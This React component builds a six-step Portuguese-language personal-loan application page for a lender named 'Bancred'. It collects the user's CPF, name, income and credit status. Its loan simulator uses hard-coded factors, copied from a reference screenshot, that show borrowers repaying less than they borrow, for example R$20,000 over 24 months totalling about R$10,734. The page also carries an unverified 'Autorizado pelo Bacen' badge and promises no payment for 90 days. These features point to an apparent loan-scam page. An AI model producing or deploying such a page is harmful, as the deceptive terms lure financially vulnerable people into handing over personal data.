import { useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  CreditCard,
  Heart,
  UtensilsCrossed,
  Home,
  Car,
  Target,
  Briefcase,
  Building2,
  Wrench,
  TrendingUp,
  UserX,
  GraduationCap,
  XCircle,
  CheckCircle2,
  DollarSign,
  Calendar,
  ChevronLeft,
  Lock,
  ShieldCheck,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";
import PartnerBanksFooter from "@/components/PartnerBanksFooter";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

// ---------- Constants ----------
const REASONS = [
  { id: "quitar-dividas", label: "Quitar dívidas", Icon: CreditCard },
  { id: "emergencia-medica", label: "Emergência médica", Icon: Heart },
  { id: "meu-negocio", label: "Meu negócio", Icon: UtensilsCrossed },
  { id: "reformar-casa", label: "Reformar casa", Icon: Home },
  { id: "comprar-veiculo", label: "Comprar veículo", Icon: Car },
  { id: "outros-motivos", label: "Outros motivos", Icon: Target },
];

const OCCUPATIONS = [
  { id: "clt", label: "Assalariado CLT", Icon: Briefcase },
  { id: "publico", label: "Servidor público", Icon: Building2 },
  { id: "autonomo", label: "Autônomo", Icon: Wrench },
  { id: "mei", label: "Empresário / MEI", Icon: TrendingUp },
  { id: "aposentado", label: "Aposentado", Icon: Heart },
  { id: "desempregado", label: "Desempregado", Icon: UserX },
  { id: "dona-casa", label: "Dona de casa", Icon: Home },
  { id: "estudante", label: "Estudante", Icon: GraduationCap },
  { id: "outro", label: "Outro", Icon: Target },
];

const PARCELAS = [12, 24, 36, 48, 60, 72];
const DIAS_PAGAMENTO = [5, 10, 15, 20, 25, 30];

// ---------- Helpers ----------
const formatBRL = (value: number) =>
  value.toLocaleString("pt-BR", { style: "currency", currency: "BRL", minimumFractionDigits: 2 });

const formatBRLShort = (value: number) =>
  `R$ ${value.toLocaleString("pt-BR")}`;

const parseRenda = (raw: string) => {
  const digits = raw.replace(/\D/g, "");
  return digits ? parseInt(digits, 10) / 100 : 0;
};

const formatRendaInput = (raw: string) => {
  const value = parseRenda(raw);
  if (!value) return "";
  return formatBRL(value);
};

// ---------- Card components ----------
const ProgressBar = ({ step, total }: { step: number; total: number }) => (
  <div style={{ marginBottom: 4 }}>
    <div
      style={{
        height: 6,
        width: "100%",
        background: "#E2E8F0",
        borderRadius: 999,
        overflow: "hidden",
      }}
    >
      <div
        style={{
          height: "100%",
          width: `${(step / total) * 100}%`,
          background: "#2563EB",
          borderRadius: 999,
          transition: "width 0.5s ease",
        }}
      />
    </div>
    <p style={{ textAlign: "center", fontSize: 12, color: "#64748B", marginTop: 12 }}>
      {step} de {total}
    </p>
  </div>
);

const StepHeader = ({ title, subtitle }: { title: string; subtitle: string }) => (
  <div style={{ marginTop: 8 }}>
    <h2
      style={{
        fontSize: 24,
        fontWeight: 700,
        color: "#0F172A",
        textAlign: "center",
        letterSpacing: -0.4,
      }}
    >
      {title}
    </h2>
    <p
      style={{
        fontSize: 14,
        color: "#64748B",
        textAlign: "center",
        marginTop: 4,
        marginBottom: 20,
      }}
    >
      {subtitle}
    </p>
  </div>
);

// ---------- Main ----------
const Oferta = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const TOTAL = 6;
  const [step, setStep] = useState(1);

  // form state
  const [motivo, setMotivo] = useState<string | null>(null);
  const [ocupacao, setOcupacao] = useState<string | null>(null);
  const [rendaText, setRendaText] = useState("");
  const [diaRecebimento, setDiaRecebimento] = useState("");
  const [situacaoCpf, setSituacaoCpf] = useState<"pendencias" | "limpo" | null>(null);
  const [valor, setValor] = useState(5000);
  const [parcelas, setParcelas] = useState<number | null>(72);
  const [melhorDia, setMelhorDia] = useState<number | null>(null);

  const renda = parseRenda(rendaText);

  // Simulação — replica exatamente a lógica do print de referência:
  // R$ 20.000 em 24x => parcela R$ 447,27 / total R$ 10.734,54.
  // Usa fator promocional por número de parcelas (parcela = valor * fator).
  const { parcelaMensal, totalPagar } = useMemo(() => {
    if (!parcelas) return { parcelaMensal: 0, totalPagar: 0 };
    // Fatores calibrados: 24x reproduz exatamente o print (0.0223635).
    // Demais prazos seguem a mesma escala promocional (parcela cai conforme alonga).
    const FATORES: Record<number, number> = {
      12: 0.0419325,   // 12x: ~50,32% do valor no total
      24: 0.0223635,   // 24x: 53,67% (referência do print)
      36: 0.0158400,   // 36x: ~57,02%
      48: 0.0126200,   // 48x: ~60,58%
      60: 0.0107150,   // 60x: ~64,29%
      72: 0.0094700,   // 72x: ~68,18%
    };
    const fator = FATORES[parcelas] ?? 0.0223635;
    const p = valor * fator;
    return { parcelaMensal: p, totalPagar: p * parcelas };
  }, [valor, parcelas]);

  const canContinue = (() => {
    switch (step) {
      case 1: return !!motivo;
      case 2: return !!ocupacao;
      case 3: return renda > 0;
      case 4: return !!situacaoCpf;
      case 5: return valor >= 1000 && !!parcelas;
      case 6: return !!melhorDia;
      default: return false;
    }
  })();

  const handleContinue = () => {
    if (!canContinue) return;
    if (step < TOTAL) {
      setStep(step + 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
      return;
    }
    // Finalizar
    const cpf = searchParams.get("cpf") ?? "";
    const nome = searchParams.get("nome") ?? "";
    const qs = new URLSearchParams();
    if (cpf) qs.set("cpf", cpf);
    if (nome) qs.set("nome", nome);
    qs.set("motivo", motivo!);
    qs.set("ocupacao", ocupacao!);
    qs.set("renda", String(renda));
    qs.set("dia_recebimento", diaRecebimento);
    qs.set("situacao_cpf", situacaoCpf!);
    qs.set("valor", String(valor));
    qs.set("parcelas", String(parcelas));
    qs.set("melhor_dia", String(melhorDia));
    navigate(`/analisando?${qs.toString()}`);
  };

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  // -------- Step renderers --------
  const renderStep1 = () => (
    <>
      <StepHeader title="Motivo do Empréstimo" subtitle="Para que você precisa do empréstimo?" />
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
        {REASONS.map(({ id, label, Icon }) => {
          const active = motivo === id;
          return (
            <button
              key={id}
              type="button"
              onClick={() => setMotivo(id)}
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
                borderRadius: 12,
                padding: 16,
                background: active ? "#EFF6FF" : "#FFFFFF",
                border: `2px solid ${active ? "#2563EB" : "#E2E8F0"}`,
                color: active ? "#1D4ED8" : "#334155",
                cursor: "pointer",
                transition: "all 0.18s ease",
                fontFamily: fontStack,
                minHeight: 96,
              }}
            >
              <Icon width={24} height={24} strokeWidth={2} />
              <span style={{ fontSize: 14, fontWeight: 500, textAlign: "center", lineHeight: 1.2 }}>
                {label}
              </span>
            </button>
          );
        })}
      </div>
    </>
  );

  const renderStep2 = () => (
    <>
      <StepHeader title="Ocupação" subtitle="Informe sua ocupação" />
      <p style={{ fontSize: 14, fontWeight: 500, color: "#334155", marginBottom: 12 }}>
        Sua ocupação
      </p>
      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
        {OCCUPATIONS.map(({ id, label, Icon }) => {
          const active = ocupacao === id;
          return (
            <button
              key={id}
              type="button"
              onClick={() => setOcupacao(id)}
              style={{
                width: "100%",
                display: "flex",
                alignItems: "center",
                gap: 12,
                borderRadius: 12,
                border: `1px solid ${active ? "#2563EB" : "#E2E8F0"}`,
                background: active ? "#EFF6FF" : "#FFFFFF",
                color: active ? "#1D4ED8" : "#334155",
                padding: 12,
                cursor: "pointer",
                textAlign: "left",
                transition: "all 0.18s ease",
                fontFamily: fontStack,
              }}
            >
              <Icon width={20} height={20} color="#3B82F6" style={{ flexShrink: 0 }} />
              <span style={{ fontSize: 14, fontWeight: 500 }}>{label}</span>
            </button>
          );
        })}
      </div>
    </>
  );

  const renderStep3 = () => (
    <>
      <StepHeader
        title="Renda e Dia de Recebimento"
        subtitle="Informe sua renda mensal e dia de recebimento"
      />
      <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
        <div>
          <div style={{ display: "flex", alignItems: "flex-start", gap: 12, marginBottom: 8 }}>
            <div
              style={{
                width: 36,
                height: 36,
                borderRadius: "50%",
                background: "#D1FAE5",
                color: "#059669",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
              }}
            >
              <DollarSign width={20} height={20} />
            </div>
            <div>
              <p style={{ fontWeight: 600, color: "#0F172A", fontSize: 15 }}>Renda mensal</p>
              <p style={{ fontSize: 12, color: "#64748B" }}>
                Informe sua renda líquida (valor que recebe)
              </p>
            </div>
          </div>
          <input
            type="text"
            inputMode="numeric"
            placeholder="R$ 0,00"
            value={rendaText}
            onChange={(e) => setRendaText(formatRendaInput(e.target.value))}
            style={{
              width: "100%",
              height: 48,
              borderRadius: 12,
              border: "1px solid #CBD5E1",
              background: "#FFFFFF",
              padding: "0 16px",
              fontSize: 16,
              color: "#0F172A",
              outline: "none",
              fontFamily: fontStack,
              boxSizing: "border-box",
            }}
            onFocus={(e) => {
              e.currentTarget.style.borderColor = "#3B82F6";
              e.currentTarget.style.boxShadow = "0 0 0 2px rgba(59,130,246,0.4)";
            }}
            onBlur={(e) => {
              e.currentTarget.style.borderColor = "#CBD5E1";
              e.currentTarget.style.boxShadow = "none";
            }}
          />
        </div>
      </div>
    </>
  );

  const renderStep4 = () => (
    <>
      <StepHeader title="Situação do CPF" subtitle="Seu nome está negativado?" />
      <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
        {[
          {
            id: "pendencias" as const,
            title: "Tenho algumas pendências",
            desc: "Nome negativado ou restrições no CPF",
            Icon: XCircle,
            iconBg: "#FFE4E6",
            iconColor: "#E11D48",
          },
          {
            id: "limpo" as const,
            title: "Meu nome está limpo",
            desc: "Sem restrições ou negativação",
            Icon: CheckCircle2,
            iconBg: "#D1FAE5",
            iconColor: "#059669",
          },
        ].map(({ id, title, desc, Icon, iconBg, iconColor }) => {
          const active = situacaoCpf === id;
          return (
            <button
              key={id}
              type="button"
              onClick={() => setSituacaoCpf(id)}
              style={{
                width: "100%",
                display: "flex",
                alignItems: "center",
                gap: 12,
                borderRadius: 12,
                border: `2px solid ${active ? "#2563EB" : "#E2E8F0"}`,
                background: active ? "#EFF6FF" : "#FFFFFF",
                padding: 16,
                cursor: "pointer",
                textAlign: "left",
                transition: "all 0.18s ease",
                fontFamily: fontStack,
              }}
            >
              <div
                style={{
                  width: 40,
                  height: 40,
                  borderRadius: "50%",
                  background: iconBg,
                  color: iconColor,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexShrink: 0,
                }}
              >
                <Icon width={20} height={20} />
              </div>
              <div>
                <p style={{ fontWeight: 600, color: "#0F172A", fontSize: 15 }}>{title}</p>
                <p style={{ fontSize: 12, color: "#64748B" }}>{desc}</p>
              </div>
            </button>
          );
        })}

        <div
          style={{
            background: "#F8FAFC",
            border: "1px solid #E2E8F0",
            borderRadius: 12,
            padding: 12,
            textAlign: "center",
          }}
        >
          <p style={{ fontSize: 12, color: "#475569" }}>
            Não se preocupe! Trabalhamos com pessoas em qualquer situação de crédito
          </p>
        </div>
      </div>
    </>
  );

  const renderStep5 = () => {
    const min = 1000;
    const max = 20000;
    const pct = ((valor - min) / (max - min)) * 100;
    return (
      <>
        <StepHeader
          title="Qual valor você precisa?"
          subtitle="Deslize o controle abaixo para ajustar o valor e parcelas"
        />
        <style>{`
          .bc-slider {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            height: 8px;
            border-radius: 999px;
            outline: none;
          }
          .bc-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: #2563EB;
            border: 3px solid #FFFFFF;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            cursor: pointer;
          }
          .bc-slider::-moz-range-thumb {
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: #2563EB;
            border: 3px solid #FFFFFF;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            cursor: pointer;
          }
        `}</style>

        {/* Valor desejado */}
        <div>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "baseline",
              marginBottom: 12,
            }}
          >
            <span style={{ fontSize: 14, fontWeight: 600, color: "#334155" }}>Valor desejado</span>
            <span style={{ fontSize: 24, fontWeight: 800, color: "#2563EB" }}>
              {formatBRLShort(valor)}
            </span>
          </div>
          <div style={{ position: "relative", padding: "12px 4px" }}>
            <input
              type="range"
              min={min}
              max={max}
              step={500}
              value={valor}
              onChange={(e) => setValor(parseInt(e.target.value, 10))}
              className="bc-slider"
              style={{
                background: `linear-gradient(to right, #1C68E3 0%, #1C68E3 ${pct}%, #DBEAFE ${pct}%, #DBEAFE 100%)`,
              }}
            />
          </div>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              fontSize: 12,
              color: "#64748B",
              marginTop: 8,
              padding: "0 4px",
            }}
          >
            <span style={{ fontWeight: 500 }}>R$ 1.000</span>
            <span style={{ color: "#2563EB", fontWeight: 600 }}>← arraste →</span>
            <span style={{ fontWeight: 500 }}>R$ 20.000</span>
          </div>
        </div>

        {/* Parcelas */}
        <div style={{ marginTop: 20 }}>
          <p style={{ fontSize: 14, fontWeight: 600, color: "#334155", marginBottom: 8 }}>
            Número de parcelas
          </p>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 8 }}>
            {PARCELAS.map((n) => {
              const active = parcelas === n;
              return (
                <button
                  key={n}
                  type="button"
                  onClick={() => setParcelas(n)}
                  style={{
                    borderRadius: 12,
                    border: `2px solid ${active ? "#2563EB" : "#E2E8F0"}`,
                    background: active ? "#EFF6FF" : "#FFFFFF",
                    color: active ? "#1D4ED8" : "#334155",
                    padding: "8px 4px",
                    cursor: "pointer",
                    transition: "all 0.18s ease",
                    fontFamily: fontStack,
                  }}
                >
                  <p style={{ fontSize: 16, fontWeight: 700, lineHeight: 1, margin: 0 }}>{n}x</p>
                  <p
                    style={{
                      fontSize: 10,
                      marginTop: 2,
                      color: "#64748B",
                    }}
                  >
                    meses
                  </p>
                </button>
              );
            })}
          </div>
        </div>

        {/* Simulação */}
        {parcelas && (
          <div
            style={{
              marginTop: 20,
              borderRadius: 12,
              border: "1px solid #A7F3D0",
              background: "#ECFDF5",
              padding: 16,
              textAlign: "center",
            }}
          >
            <p
              style={{
                fontSize: 14,
                fontWeight: 600,
                color: "#047857",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 4,
              }}
            >
              <DollarSign width={16} height={16} /> Sua simulação
            </p>
            <p style={{ fontSize: 12, color: "#047857", marginTop: 12 }}>Parcela mensal</p>
            <p style={{ fontSize: 22, fontWeight: 700, color: "#0F172A" }}>
              {formatBRL(parcelaMensal)}
            </p>
            <p style={{ fontSize: 12, color: "#047857", marginTop: 8 }}>Total a pagar</p>
            <p style={{ fontSize: 18, fontWeight: 700, color: "#0F172A" }}>
              {formatBRL(totalPagar)}
            </p>
            <p style={{ fontSize: 12, color: "#047857", marginTop: 8 }}>
              {parcelas} parcelas de {formatBRL(parcelaMensal)}
            </p>
          </div>
        )}

        <div
          style={{
            marginTop: 12,
            background: "#EFF6FF",
            border: "1px solid #DBEAFE",
            borderRadius: 12,
            padding: 8,
            textAlign: "center",
          }}
        >
          <p style={{ fontSize: 12, color: "#1D4ED8" }}>Valores sujeitos à análise de crédito.</p>
        </div>
      </>
    );
  };

  const renderStep6 = () => (
    <>
      <StepHeader
        title="Melhor Dia"
        subtitle="Primeira parcela só daqui a 90 dias. Mais tempo, menos preocupação."
      />
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 12 }}>
        {DIAS_PAGAMENTO.map((d) => {
          const active = melhorDia === d;
          return (
            <button
              key={d}
              type="button"
              onClick={() => setMelhorDia(d)}
              style={{
                borderRadius: 12,
                border: `2px solid ${active ? "#2563EB" : "#E2E8F0"}`,
                background: active ? "#EFF6FF" : "#FFFFFF",
                color: active ? "#1D4ED8" : "#334155",
                padding: "12px 4px",
                cursor: "pointer",
                transition: "all 0.18s ease",
                fontFamily: fontStack,
              }}
            >
              <p style={{ fontSize: 24, fontWeight: 700, lineHeight: 1, margin: 0 }}>{d}</p>
              <p style={{ fontSize: 11, marginTop: 4, color: "#64748B" }}>todo mês</p>
            </button>
          );
        })}
      </div>
    </>
  );

  const renderStep = () => {
    switch (step) {
      case 1: return renderStep1();
      case 2: return renderStep2();
      case 3: return renderStep3();
      case 4: return renderStep4();
      case 5: return renderStep5();
      case 6: return renderStep6();
      default: return null;
    }
  };

  const continueLabel = step === TOTAL ? "Finalizar análise" : "Continuar";

  return (
    <div
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        background: "#F1F5F9",
        fontFamily: fontStack,
        color: "#0F172A",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E2E8F0",
          padding: "16px 16px",
          textAlign: "center",
          paddingTop: "calc(16px + env(safe-area-inset-top))",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main style={{ flex: 1, padding: "20px 16px 32px" }}>
        <div style={{ maxWidth: 448, margin: "0 auto" }}>
          <div style={{ marginBottom: 16 }}>
            <ConsultorCard />
          </div>
          <div
            style={{
              background: "#FFFFFF",
              borderRadius: 16,
              boxShadow: "0 10px 15px -3px rgba(0,0,0,0.08), 0 4px 6px -4px rgba(0,0,0,0.05)",
              border: "1px solid #E2E8F0",
              padding: 24,
            }}
          >
            <ProgressBar step={step} total={TOTAL} />
            {renderStep()}

            <div style={{ marginTop: 24, display: "flex", alignItems: "center", gap: 12 }}>
              {step > 1 && (
                <button
                  type="button"
                  onClick={handleBack}
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    gap: 4,
                    borderRadius: 12,
                    border: "1px solid #CBD5E1",
                    background: "#FFFFFF",
                    padding: "0 16px",
                    height: 48,
                    fontSize: 14,
                    fontWeight: 500,
                    color: "#334155",
                    cursor: "pointer",
                    fontFamily: fontStack,
                  }}
                >
                  <ChevronLeft width={16} height={16} /> Voltar
                </button>
              )}
              <button
                type="button"
                disabled={!canContinue}
                onClick={handleContinue}
                style={{
                  flex: 1,
                  borderRadius: 12,
                  height: 48,
                  fontSize: 14,
                  fontWeight: 700,
                  color: "#FFFFFF",
                  border: "none",
                  cursor: canContinue ? "pointer" : "not-allowed",
                  background: canContinue ? "#2563EB" : "#93C5FD",
                  boxShadow: "0 4px 6px -1px rgba(0,0,0,0.1)",
                  transition: "background 0.2s ease",
                  fontFamily: fontStack,
                }}
                onMouseEnter={(e) => {
                  if (canContinue) e.currentTarget.style.background = "#1D4ED8";
                }}
                onMouseLeave={(e) => {
                  if (canContinue) e.currentTarget.style.background = "#2563EB";
                }}
              >
                {continueLabel}
              </button>
            </div>
          </div>

          <div
            style={{
              marginTop: 16,
              display: "flex",
              justifyContent: "center",
            }}
          >
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                background: "#ECFDF5",
                border: "1px solid #A7F3D0",
                borderRadius: 999,
                padding: "5px 10px",
                fontSize: 11,
                fontWeight: 600,
                color: "#047857",
                fontFamily: fontStack,
                whiteSpace: "nowrap",
              }}
            >
              <span style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
                <Lock width={11} height={11} /> Site protegido por SSL
              </span>
              <span style={{ width: 2, height: 2, borderRadius: "50%", background: "#34D399" }} />
              <span style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
                <ShieldCheck width={11} height={11} /> Autorizado pelo Bacen
              </span>
            </div>
          </div>
        </div>
      </main>

      <PartnerBanksFooter variant="light" />
    </div>
  );
};

export default Oferta;
